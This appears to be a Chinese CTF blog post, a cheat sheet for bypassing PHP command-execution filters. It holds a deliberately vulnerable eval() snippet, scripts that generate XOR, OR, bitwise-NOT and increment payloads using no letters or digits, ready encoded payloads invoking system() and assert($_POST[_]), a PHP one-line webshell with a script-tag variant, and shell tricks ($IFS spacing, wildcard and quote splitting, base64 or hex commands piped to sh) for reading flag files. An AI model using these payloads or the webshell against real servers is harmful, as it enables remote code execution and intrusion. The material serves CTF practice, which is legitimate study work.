+<h2 id="4-无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）"><a href="#4-无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）" class="headerlink" title="4.无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）"></a>4.无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/i&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="1）异或"><a href="#1）异或" class="headerlink" title="1）异或"></a>1）<strong>异或</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>php运行后生成一个txt文档，包含所有可见字符的异或构造结果。<br>接着运行python脚本即可。<br>运行结果</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">php运行后生成一个txt文档，包含所有可见字符的异或构造结果。</span><br><span class="line">接着运行python脚本即可。</span><br><span class="line">运行结果</span><br><span class="line"></span><br><span class="line">[+] your function：system</span><br><span class="line">[+] your command：ls</span><br><span class="line">(<span class="string">&quot;%08%02%08%08%05%0d&quot;</span>^<span class="string">&quot;%7b%7b%7b%7c%60%60&quot;</span>)(<span class="string">&quot;%0c%08&quot;</span>^<span class="string">&quot;%60%7b&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="2）或"><a href="#2）或" class="headerlink" title="2）或"></a>2）或</h3><p>system(“ls”);     使用XOR绕过，得到目录信息</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?a=<span class="variable">$_</span>=(<span class="string">&#x27;(&quot;((%-&#x27;</span> ^ <span class="string">&#x27;[[[\@@&#x27;</span>);<span class="variable">$__</span>=(<span class="string">&#x27;[,([&#x27;</span>^<span class="string">&#x27;|@[|&#x27;</span>);<span class="variable">$_</span>(<span class="variable">$__</span>);</span><br></pre></td></tr></table></figure>
+
+<p>原理是一样的，只需要在上面的脚本上稍加改动即可</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* author yu22x */</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;or_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[0-9a-z]/i&#x27;</span>;<span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;or_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="3）取反"><a href="#3）取反" class="headerlink" title="3）取反"></a>3）取反</h3><p>因为取反的话，基本上用的都是一个不可见字符，所有不会触发到<a href="https://so.csdn.net/so/search?q=%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F&spm=1001.2101.3001.7020">正则表达式</a>，我们一个php脚本就可以</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//在命令行中运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="4）自增"><a href="#4）自增" class="headerlink" title="4）自增"></a>4）自增</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//测试发现7.0.12以上版本不可使用</span></span><br><span class="line"><span class="comment">//使用时需要url编码下</span></span><br><span class="line"><span class="variable">$_</span>=[];<span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>;<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>];<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=<span class="variable">$$____</span>;<span class="variable">$___</span>(<span class="variable">$_</span>[_]);</span><br><span class="line">固定格式 构造出来的 <span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[_]);</span><br><span class="line">然后post传入   _=<span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="5）利用UTF-8编码进行异或绕过-使用post传参数​2-system-cat-zheshiflag-php-。​"><a href="#5）利用UTF-8编码进行异或绕过-使用post传参数​2-system-cat-zheshiflag-php-。​" class="headerlink" title="5）利用UTF-8编码进行异或绕过,使用post传参数​2=system(&#39;cat zheshiflag.php &#39;)。​"></a>5）<strong>利用UTF-8编码进行异或绕过,使用post传参数</strong>​<code>2=system(&#39;cat zheshiflag.php &#39;)。</code>​</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url?a=<span class="variable">$__</span>=(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>)+(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>);</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$__</span>/<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$___</span>=<span class="string">&quot;瞰&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;和&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;和&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;的&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;半&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;始&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$___</span>=<span class="string">&quot;俯&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;瞰&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;次&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;站&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$_____</span>;</span><br><span class="line"><span class="variable">$____</span>(<span class="variable">$_</span>[<span class="variable">$__</span>]);</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/10/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/image-20231015100334-3qcjdcw.png" class="" title="image">​
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">除这些之外我们还可以这样用`<span class="variable">$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;</span>&#123;%86&#125;();&amp;%86=phpinfo`​其中`<span class="string">&quot;%86%86%86%86^%d9%c1%c3%d2&quot;</span>`​为构造出的`_GET`​，适合于过滤了引号的情况下使用。</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="5-一句话木马中的-被过滤"><a href="#5-一句话木马中的-被过滤" class="headerlink" title="5.一句话木马中的?被过滤"></a>5.一句话木马中的?被过滤</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>绕过</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls /&quot;</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="6-将文件上传的文件名进行随机化"><a href="#6-将文件上传的文件名进行随机化" class="headerlink" title="6.将文件上传的文件名进行随机化"></a>6.将文件上传的文件名进行随机化</h2><p>可以利用文件上传+文件包含读取flag</p>
+<img src="/2023/10/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/image-20231018103852-5tjnm7a.png" class="" title="image">​
+
+<h2 id="7-命令联合执行"><a href="#7-命令联合执行" class="headerlink" title="7.命令联合执行"></a>7.命令联合执行</h2><p>;     前面的执行完执行后面的<br>|     管道符，上一条命令的输出，作为下一条命令的参数（显示后面的执行结果）</p>
+<p>||    当前面的执行出错时（为假）执行后面的<br>&amp;     将任务置于后台执行<br>&amp;&amp;    前面的语句为假则直接出错，后面的也不执行，前面只能为真<br>%0a  （换行）<br>%0d  （回车）</p>
+<p>‍</p>
+<h2 id="8-反引号"><a href="#8-反引号" class="headerlink" title="8.反引号&#96;"></a>8.反引号&#96;</h2><p>内联，就是将反引号内命令的输出作为输入执行</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?ip=<span class="number">127.0</span>.<span class="number">0.1</span>;cat$IFS$<span class="number">9</span>`ls`</span><br><span class="line"></span><br><span class="line"><span class="variable">$IFS</span>在Linux下表示为空格</span><br><span class="line">$<span class="number">9</span>是当前系统shell进程第九个参数持有者，始终为空字符串，$后可以接任意数字</span><br><span class="line"></span><br><span class="line">这里$IFS$<span class="number">9</span>或<span class="variable">$IFS</span>垂直，后面加个$与&#123;&#125;类似，起截断作用</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="9-flag过滤"><a href="#9-flag过滤" class="headerlink" title="9.flag过滤"></a>9.flag过滤</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span>$IFS$<span class="number">1</span>Y2F0IGZsYWcucGhw|base64$IFS$<span class="number">1</span>-d|sh     <span class="comment">#sh是执行echo后面的解码内容</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a=ag;b=fl;cat $b<span class="variable">$a</span>;   <span class="comment">#注意有时候需要将ab的顺便倒置才能getshell</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cat fl*  用*匹配任意 </span><br><span class="line">cat fla* 用*匹配任意</span><br><span class="line">ca\t fla\g.php        反斜线绕过</span><br><span class="line">cat fl<span class="string">&#x27;&#x27;</span>ag.php        两个单引号绕过</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Y2F0IGZsYWcucGhw&quot;</span> | base64 -d | bash    </span><br><span class="line"><span class="comment">//base64编码绕过(引号可以去掉)  |(管道符) 会把前一个命令的输出作为后一个命令的参数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;63617420666c61672e706870&quot;</span> | xxd -r -p | bash     </span><br><span class="line"><span class="comment">//hex编码绕过(引号可以去掉)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;63617420666c61672e706870&quot;</span> | xxd -r -p | sh   </span><br><span class="line"><span class="comment">//sh的效果和bash一样</span></span><br><span class="line"></span><br><span class="line">cat fl[a]g.php       用[]匹配</span><br><span class="line"></span><br><span class="line">a=fl;b=ag;cat $a<span class="variable">$b</span>          变量替换</span><br><span class="line">cp fla&#123;g.php,G&#125;    把flag.php复制为flaG</span><br><span class="line">ca$&#123;<span class="number">21</span>&#125;t a.txt     利用空变量  